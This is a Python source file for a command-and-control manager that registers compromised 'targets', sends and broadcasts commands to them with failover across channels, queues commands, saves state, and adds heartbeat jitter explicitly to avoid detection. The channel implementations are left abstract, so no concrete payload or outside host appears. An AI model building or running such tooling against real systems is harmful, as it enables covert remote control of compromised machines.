"""
C2 Manager - Orchestrates Command and Control Infrastructure
Manages multiple C2 channels, handles failover, and coordinates communication
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any
from datetime import datetime
from pathlib import Path
import json
import random

logger = logging.getLogger(__name__)


class C2Channel:
    """Base class for C2 communication channels"""
    
    def __init__(self, name: str, priority: int = 5):
        self.name = name
        self.priority = priority
        self.active = False
        self.last_contact = None
        self.failure_count = 0
        self.max_failures = 3
        
    async def initialize(self) -> bool:
        """Initialize the channel"""
        raise NotImplementedError
        
    async def send_command(self, target: str, command: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send command to target"""
        raise NotImplementedError
        
    async def receive_response(self, target: str, timeout: int = 30) -> Optional[Dict[str, Any]]:
        """Receive response from target"""
        raise NotImplementedError
        
    async def heartbeat(self, target: str) -> bool:
        """Check if target is alive"""
        raise NotImplementedError
        
    def mark_failure(self):
        """Mark a communication failure"""
        self.failure_count += 1
        if self.failure_count >= self.max_failures:
            self.active = False
            logger.warning(f"Channel {self.name} disabled after {self.failure_count} failures")
            
    def mark_success(self):
        """Mark successful communication"""
        self.failure_count = 0
        self.last_contact = datetime.now()
        self.active = True


class C2Manager:
    """
    C2 Infrastructure Manager
    Orchestrates multiple C2 channels with automatic failover
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.channels: List[C2Channel] = []
        self.active_targets: Dict[str, Dict[str, Any]] = {}
        self.command_queue: Dict[str, List[Dict[str, Any]]] = {}
        self.response_cache: Dict[str, List[Dict[str, Any]]] = {}
        
        # C2 configuration
        self.heartbeat_interval = self.config.get('heartbeat_interval', 60)
        self.max_retries = self.config.get('max_retries', 3)
        self.jitter_percent = self.config.get('jitter_percent', 20)
        
        logger.info("C2Manager initialized")
        
    def register_channel(self, channel: C2Channel):
        """Register a C2 channel"""
        self.channels.append(channel)
        self.channels.sort(key=lambda x: x.priority, reverse=True)
        logger.info(f"Registered C2 channel: {channel.name} (priority: {channel.priority})")
        
    async def initialize_channels(self):
        """Initialize all registered channels"""
        logger.info("Initializing C2 channels...")
        
        tasks = []
        for channel in self.channels:
            tasks.append(self._init_channel(channel))
            
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        active_count = sum(1 for r in results if r is True)
        logger.info(f"Initialized {active_count}/{len(self.channels)} C2 channels")
        
    async def _init_channel(self, channel: C2Channel) -> bool:
        """Initialize a single channel"""
        try:
            success = await channel.initialize()
            if success:
                channel.active = True
                logger.info(f"Channel {channel.name} initialized successfully")
            return success
        except Exception as e:
            logger.error(f"Failed to initialize channel {channel.name}: {e}")
            return False
            
    def register_target(self, target_id: str, metadata: Optional[Dict[str, Any]] = None):
        """Register a new target"""
        self.active_targets[target_id] = {
            'registered': datetime.now(),
            'last_seen': datetime.now(),
            'metadata': metadata or {},
            'preferred_channel': None,
            'command_count': 0
        }
        self.command_queue[target_id] = []
        self.response_cache[target_id] = []
        logger.info(f"Registered target: {target_id}")
        
    async def send_command(self, target_id: str, command: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Send command to target with automatic failover
        
        Args:
            target_id: Target identifier
            command: Command dictionary with 'type' and other parameters
            
        Returns:
            Response from target or None if failed
        """
        if target_id not in self.active_targets:
            logger.error(f"Unknown target: {target_id}")
            return None
            
        # Add command metadata
        command['id'] = f"cmd_{datetime.now().timestamp()}"
        command['timestamp'] = datetime.now().isoformat()
        
        # Try channels in priority order
        for channel in self.channels:
            if not channel.active:
                continue
                
            try:
                logger.info(f"Sending command to {target_id} via {channel.name}: {command['type']}")
                
                response = await channel.send_command(target_id, command)
                
                if response:
                    channel.mark_success()
                    self.active_targets[target_id]['last_seen'] = datetime.now()
                    self.active_targets[target_id]['preferred_channel'] = channel.name
                    self.active_targets[target_id]['command_count'] += 1
                    
                    # Cache response
                    self.response_cache[target_id].append({
                        'command': command,
                        'response': response,
                        'timestamp': datetime.now(),
                        'channel': channel.name
                    })
                    
                    logger.info(f"Command executed successfully via {channel.name}")
                    return response
                else:
                    channel.mark_failure()
                    
            except Exception as e:
                logger.error(f"Channel {channel.name} failed: {e}")
                channel.mark_failure()
                continue
                
        logger.error(f"All channels failed for target {target_id}")
        return None
        
    async def queue_command(self, target_id: str, command: Dict[str, Any]):
        """Queue command for later delivery"""
        if target_id not in self.command_queue:
            self.command_queue[target_id] = []
            
        command['queued_at'] = datetime.now().isoformat()
        self.command_queue[target_id].append(command)
        logger.info(f"Queued command for {target_id}: {command['type']}")
        
    async def process_queue(self, target_id: str):
        """Process queued commands for a target"""
        if target_id not in self.command_queue:
            return
            
        queue = self.command_queue[target_id]
        
        while queue:
            command = queue[0]
            response = await self.send_command(target_id, command)
            
            if response:
                queue.pop(0)
            else:
                logger.warning(f"Failed to deliver queued command to {target_id}")
                break
                
    async def heartbeat_loop(self, target_id: str):
        """Maintain heartbeat with target"""
        while target_id in self.active_targets:
            try:
                # Add jitter to prevent pattern detection
                jitter = random.uniform(
                    -self.heartbeat_interval * self.jitter_percent / 100,
                    self.heartbeat_interval * self.jitter_percent / 100
                )
                await asyncio.sleep(self.heartbeat_interval + jitter)
                
                # Try to reach target
                alive = False
                for channel in self.channels:
                    if channel.active:
                        try:
                            if await channel.heartbeat(target_id):
                                alive = True
                                self.active_targets[target_id]['last_seen'] = datetime.now()
                                break
                        except Exception as e:
                            logger.debug(f"Heartbeat failed on {channel.name}: {e}")
                            continue
                            
                if not alive:
                    logger.warning(f"Target {target_id} not responding to heartbeat")
                    
            except Exception as e:
                logger.error(f"Heartbeat loop error for {target_id}: {e}")
                await asyncio.sleep(10)
                
    async def broadcast_command(self, command: Dict[str, Any]) -> Dict[str, Optional[Dict[str, Any]]]:
        """Broadcast command to all active targets"""
        logger.info(f"Broadcasting command: {command['type']}")
        
        tasks = []
        for target_id in self.active_targets.keys():
            tasks.append(self.send_command(target_id, command.copy()))
            
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        return {
            target_id: response if not isinstance(response, Exception) else None
            for target_id, response in zip(self.active_targets.keys(), responses)
        }
        
    def get_target_status(self, target_id: str) -> Optional[Dict[str, Any]]:
        """Get status information for a target"""
        if target_id not in self.active_targets:
            return None
            
        target = self.active_targets[target_id]
        
        return {
            'target_id': target_id,
            'registered': target['registered'].isoformat(),
            'last_seen': target['last_seen'].isoformat(),
            'preferred_channel': target['preferred_channel'],
            'command_count': target['command_count'],
            'queued_commands': len(self.command_queue.get(target_id, [])),
            'cached_responses': len(self.response_cache.get(target_id, [])),
            'metadata': target['metadata']
        }
        
    def get_channel_status(self) -> List[Dict[str, Any]]:
        """Get status of all channels"""
        return [
            {
                'name': channel.name,
                'priority': channel.priority,
                'active': channel.active,
                'last_contact': channel.last_contact.isoformat() if channel.last_contact else None,
                'failure_count': channel.failure_count
            }
            for channel in self.channels
        ]
        
    async def cleanup(self):
        """Cleanup resources"""
        logger.info("Cleaning up C2Manager...")
        
        # Could add cleanup tasks here
        self.active_targets.clear()
        self.command_queue.clear()
        
    async def save_state(self, filepath: Path):
        """Save C2 state to disk"""
        state = {
            'targets': {
                tid: {
                    'registered': t['registered'].isoformat(),
                    'last_seen': t['last_seen'].isoformat(),
                    'metadata': t['metadata'],
                    'command_count': t['command_count']
                }
                for tid, t in self.active_targets.items()
            },
            'queued_commands': self.command_queue,
            'timestamp': datetime.now().isoformat()
        }
        
        filepath.parent.mkdir(parents=True, exist_ok=True)
        with open(filepath, 'w') as f:
            json.dump(state, f, indent=2)
            
        logger.info(f"Saved C2 state to {filepath}")
        
    async def load_state(self, filepath: Path):
        """Load C2 state from disk"""
        if not filepath.exists():
            logger.warning(f"State file not found: {filepath}")
            return
            
        with open(filepath) as f:
            state = json.load(f)
            
        # Restore targets
        for tid, tdata in state.get('targets', {}).items():
            self.active_targets[tid] = {
                'registered': datetime.fromisoformat(tdata['registered']),
                'last_seen': datetime.fromisoformat(tdata['last_seen']),
                'metadata': tdata['metadata'],
                'preferred_channel': None,
                'command_count': tdata['command_count']
            }
            
        # Restore queued commands
        self.command_queue = state.get('queued_commands', {})
        
        logger.info(f"Loaded C2 state from {filepath}")
